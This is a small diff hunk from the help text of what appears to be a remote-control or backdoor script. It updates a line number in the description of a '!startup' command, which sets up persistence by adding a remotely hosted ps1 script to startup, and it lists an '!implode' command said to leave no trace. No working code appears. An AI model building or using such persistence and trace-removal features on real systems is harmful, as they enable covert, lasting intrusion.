@@ -1070,7 +1070,7 @@ E          X          A          M          P          L          E          S
 
 47. !startup           // Enables persistence for this script
         will add a ps1 script to startup
-        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
+        on line 15, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
     Example: !startup
 
 48. !implode           // Triggers a system implosion (Leaves no trace)
